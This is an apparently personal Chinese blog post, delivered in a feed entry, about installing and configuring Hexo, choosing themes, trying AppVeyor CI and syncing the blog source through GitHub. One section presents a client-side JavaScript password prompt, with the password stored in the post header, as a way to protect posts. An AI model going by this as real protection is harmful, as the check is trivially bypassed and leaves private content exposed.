<pre><code>sudo npm install -g hexo-cli --registry=https://registry.npm.taobao.org
</code></pre><h3 id="配置Hexo"><a href="#配置Hexo" class="headerlink" title="配置Hexo"></a>配置Hexo</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">mkdir <span class="variable">$Blog</span>-name &amp;&amp; <span class="built_in">cd</span> <span class="variable">$Blog</span>-name</div><div class="line">hexo init <span class="variable">$blog</span></div><div class="line"><span class="built_in">cd</span> <span class="variable">$blog</span></div></pre></td></tr></table></figure>
<h3 id="Hexo-用法"><a href="#Hexo-用法" class="headerlink" title="Hexo 用法"></a>Hexo 用法</h3><ol>
<li><p>常用命令列表：</p>
<ol>
<li><strong>~ generate <g>        #生成静态文件</g></strong></li>
<li><strong>~ server <s>          #本地预览环境</s></strong></li>
<li><strong>~ new “paper name”    #创建博文</strong></li>
<li><strong>~ deploy <d>          #部署</d></strong></li>
<li>~ new page “page name”  #创建页面<br>本地测试在浏览器中打开 localhost:4000</li>
</ol>
</li>
<li><p>Hexo根目录结构</p>
</li>
</ol>
<ul>
<li><p>需要上传到 source repo 的文件</p>
<p>  #全局配置文件，站点基本信息(title/subtitle/author/..), 主题 …<br>  -rw-rw-r–  1 floatg floatg 1.5K  1月 21 16:51 _config.yml</p>
<p>  #所有博文都在source/目录下<br>  drwxrwxr-x  3 floatg floatg 4.0K  1月 21 16:51 source<br>  drwxrwxr-x  2 floatg floatg 4.0K  1月 21 16:51 scaffolds<br>  -rw-rw-r–  1 floatg floatg  448  1月 21 17:07 package.json</p>
<p>  #所有可以使用的主题都在这个目录下，每个主题对应一个文件夹<br>  drwxrwxr-x  4 floatg floatg 4.0K  1月 21 17:17 themes<br>  -rw-r–r–  1 floatg floatg  77B  1 23 15:39 .gitignore</p>
</li>
<li><p>.gitignore 过滤的文件</p>
<p>  -rw-rw-r–  1 floatg floatg  24K  1月 21 17:07 db.json<br>  drwxrwxr-x 12 floatg floatg 4.0K  1月 21 16:53 node_modules<br>  drwxrwxr-x  7 floatg floatg 4.0K  1月 21 17:07 public<br>  drwxr-xr-x   17 floatg  floatg   578B  1 23 15:16 .deploy_git</p>
</li>
</ul>
<p>#本地测试脚本<br>    -rwxr-xr-x    1 floatg  floatg    91B  1 23 14:38 rtest.sh<br>    -rw-r–r–@   1 floatg  floatg   6.0K  1 23 14:55 .DS_Store</p>
<h3 id="切换主题"><a href="#切换主题" class="headerlink" title="切换主题"></a>切换主题</h3><p>目前 我找到的主题比较少，只有默认的landscape 和huno，较喜欢huno。</p>
<ol>
<li><p>下载主题</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">cd</span> themes</div><div class="line">git <span class="built_in">clone</span> git@github.com:someus/huno.git</div></pre></td></tr></table></figure>
</li>
<li><p>分析主题</p>
<ol>
<li>cyanstyle 可以设置背景图片,并且page主体是一个半透明的theme, 建议背景图片搞一个深色的图</li>
<li>huno  左右布局，极简风格，category,目录等基本功能齐全</li>
<li>landscape 上下布局</li>
<li>icarus  感觉是设计，艺术风，推荐给@Alian。 这个主体还有一些<a href="https://github.com/ppoffice/hexo-theme-icarus/issues" target="_blank" rel="external">bug</a>,测试的时候存在显示<a href="https://github.com/ppoffice/hexo-theme-icarus/wiki" target="_blank" rel="external">问题</a></li>
<li>aero-dual  上下布局，喜欢配色</li>
<li>yelee    很喜欢， 冬天显示列表+目录</li>
<li>xnew      目录+归档–按日期排列</li>
<li>GhoSadillaX  使用中</li>
</ol>
</li>
</ol>
<h2 id="更多功能"><a href="#更多功能" class="headerlink" title="更多功能"></a>更多功能</h2><p>(更多内容)[<a href="http://ibruce.info/2013/11/22/hexo-your-blog/" target="_blank" rel="external">http://ibruce.info/2013/11/22/hexo-your-blog/</a>]<br>(统计)[<a href="http://busuanzi.ibruce.info/" target="_blank" rel="external">http://busuanzi.ibruce.info/</a>]</p>
<p>hexo config review<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">hexo: 3.2.2</div><div class="line">hexo-cli: 1.0.2</div><div class="line">os: Linux 4.x.x-xx-generic linux xxx</div><div class="line">http_parser: 1.0</div><div class="line">node: 0.10.25</div><div class="line">v8: 3.xx.5.9</div><div class="line">ares: 1.10.0</div><div class="line">uv: 0.10.23</div><div class="line">zlib: 1.2.8</div><div class="line">modules: 11</div><div class="line">openssl: x.x.xf</div></pre></td></tr></table></figure></p>
<h2 id="夸主机同步-Blog"><a href="#夸主机同步-Blog" class="headerlink" title="夸主机同步 Blog"></a>夸主机同步 Blog</h2><h3 id="CI辅助自动部署"><a href="#CI辅助自动部署" class="headerlink" title="CI辅助自动部署"></a>CI辅助自动部署</h3><p>参考文章:<br><a href="http://lotabout.me/2016/Hexo-Auto-Deploy-to-Github/" target="_blank" rel="external">http://lotabout.me/2016/Hexo-Auto-Deploy-to-Github/</a><br><a href="https://formulahendry.github.io/2016/12/04/hexo-ci/" target="_blank" rel="external">https://formulahendry.github.io/2016/12/04/hexo-ci/</a></p>
<p>我首先尝试了使用appveyor 做CI的办法，效果不尽如人意。主要的问题在：</p>
<pre><code>1. nodejs, hexo的版本和我本地不同，导致命令 解析都不一样。解决办法：可以在yml中下载制定版本
2. 使用作者的yml, 直接把我content repo下的内容删除了连site都打不开了。
3. 执行速度很慢，push完成以后貌似要到[appveyor管理页面](https://ci.appveyor.com/project/FloatingGuy/floatingguy-github-io)去点击 **new build** 才能执行下去。
</code></pre><p>虽然有一些bug，不过还是蛮有趣的产品。先说下原理，再说下大概的步骤：</p>
<ol>
<li><p>原理：CI工具(这里是appveyor)会监控代码管理(github)中指定repo的commit记录, 发现有新的commit 就会将代码拉取到CI主机上，然后去执行repo根目录下的appveyor.yml中的命令。</p>
</li>
<li><p>步骤:</p>
<ol>
<li>open appveyor <a href="https://ci.appveyor.com/projects" target="_blank" rel="external">projects page</a></li>
<li>create new projects, choose Github, source-code repo (支持的所有代码管理工具)</li>
<li>add appveyor.yml to source-code repo root directory</li>
<li>get Token from <a href="https://help.github.com/articles/creating-an-access-token-for-command-line-use/" target="_blank" rel="external">Github</a></li>
<li>CI platform to <a href="https://ci.appveyor.com/tools/encrypt" target="_blank" rel="external">encrypt Token page</a></li>
<li>set CI environment<ul>
<li>STATIC_SITE_REPO    – github content repo</li>
<li>TARGET_BRANCH       – content repo branch</li>
<li>GIT_USER_EMAIL      – github account</li>
<li>GIT_USER_NAME       – github username</li>
</ul>
</li>
<li>oK,  you can using your blog， finally push source repo</li>
<li><strong>Debug</strong> project page can monitor appveyor.yml file <a href="https://ci.appveyor.com/project/FloatingGuy/floatingguy-github-io" target="_blank" rel="external">console</a></li>
</ol>
</li>
</ol>
<p><del>最终没有找到好的解决办法,目前就先这样啦,等找到办法了再来更新</del></p>
<h3 id="github-托管-source"><a href="#github-托管-source" class="headerlink" title="github 托管 source"></a>github 托管 source</h3><p>原理就是将常用电脑上的 blog根目录下建立 git仓库(source repo)，然后注意哪些文件要上传，哪些不能上传。以后可以在任意一台电脑上将 source repo clone 到本地，然后按照下面的步骤来配置。<br>步骤：</p>
<ol>
<li>安装 node-v6.9.4</li>
<li>clone 到本地以后，进入 repo目录然后安装工具&amp;模块。</li>
<li><p>执行下面的命令就可以配置好 hexo</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">npm install hexo --save</div><div class="line">npm install</div><div class="line">npm install hexo-deployer-git --save</div></pre></td></tr></table></figure>
</li>
<li><p>下面就是测试 server,generate,deploy命令了</p>
</li>
</ol>
<p>再来总结一下哪些文件需要上传，哪些不能上传：<br>上传:</p>
<pre><code>* _config.yml
* theme/
* source/
* scaffolds/
* package.json
* .gitignore
</code></pre><p>theme 下所有的.git/目录要删除，.gitignore 根据需要做修改。</p>
<p>不上传:</p>
<pre><code>* .git/
* db.json
* node_modules/
* public/
* .deploy_git/
</code></pre><blockquote>
<p>我遇到的坑, 在使用 GhoSadillaX 主题时，因为其gitignore 不上传_config.yml, 导致在 mac 上测试一直显示 duoshao 没配置short_name, 最后还是把 theme下的_config.yml找回来才解决。</p>
</blockquote>
<h3 id="hexo-博文设置-密码验证"><a href="#hexo-博文设置-密码验证" class="headerlink" title="hexo 博文设置 密码验证"></a>hexo 博文设置 密码验证</h3><p>首先，我们要了解 hexo 支持 markdown和javascript 混合编程。那么要实现对 单独的blog 加密，就可以在md 文件中嵌入一段校验密码的 js代码，如果要对所有的 blog 加密可以在 theme 中的 layout/_partial/header.ejs文件中添加一段校验密码的 js代码。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">&lt;script&gt;</div><div class="line">    <span class="keyword">if</span>( prompt(<span class="string">"Please input password"</span>) !== <span class="built_in">String</span>(&#123;&#123; password &#125;&#125;) )</div><div class="line">    &#123;</div><div class="line">        alert(<span class="string">'密码错误！'</span>);</div><div class="line">        self.location=<span class="string">'http://localhost:4000/about/'</span>;</div><div class="line">        <span class="comment">// history.back();</span></div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        alert(<span class="string">"密码正确"</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&lt;<span class="regexp">/script&gt;</span></div></pre></td></tr></table></figure></p>
<p>password 可以在 md文件头部设置<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">---</div><div class="line">title: xxx</div><div class="line">date: 2017-</div><div class="line">tags:  [xx,zz]</div><div class="line">categories:</div><div class="line">password: password</div><div class="line">---</div></pre></td></tr></table></figure></p>
<h2 id="辅助脚本"><a href="#辅助脚本" class="headerlink" title="辅助脚本"></a>辅助脚本</h2><h3 id="本地测试脚本"><a href="#本地测试脚本" class="headerlink" title="本地测试脚本"></a>本地测试脚本</h3><p>rtest.sh<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">Bhome=/home/floatg/data/FG-B<span class="built_in">log</span>/hexo/blog</div><div class="line">killall -9 hexo</div><div class="line"><span class="built_in">cd</span> <span class="variable">$Bhome</span></div><div class="line">hexo g</div><div class="line">hexo s</div></pre></td></tr></table></figure></p>
<h3 id="gitignore-内容"><a href="#gitignore-内容" class="headerlink" title=".gitignore 内容"></a>.gitignore 内容</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">.DS_Store</div><div class="line">*.log</div><div class="line">/.deploy*</div><div class="line">/_config.yml</div><div class="line">node_modules/</div><div class="line">public/</div><div class="line">rtest.sh</div><div class="line">db.json</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;基础配置（一）&quot;&gt;&lt;a href=&quot;#基础配置（一）&quot; class=&quot;headerlink&quot; title=&quot;基础配置（一）&quot;&gt;&lt;/a&gt;基础配置（一）&lt;/h2&gt;&lt;h3 id=&quot;工具安装&quot;&gt;&lt;a href=&quot;#工具安装&quot; class=&quot;headerlink&quot; title=&quot;工具安装&quot;&gt;&lt;/a&gt;工具安装&lt;/h3&gt;
    
    </summary>
    
      <category term="捣鼓" scheme="http://yoursite.com/categories/categories-fiddle/"/>
    
    
      <category term="Hexo" scheme="http://yoursite.com/tags/Hexo/"/>
    
      <category term="AppVeyor" scheme="http://yoursite.com/tags/AppVeyor/"/>
    
      <category term="CI" scheme="http://yoursite.com/tags/CI/"/>
    
      <category term="Git" scheme="http://yoursite.com/tags/Git/"/>
    
  </entry>
  
</feed>
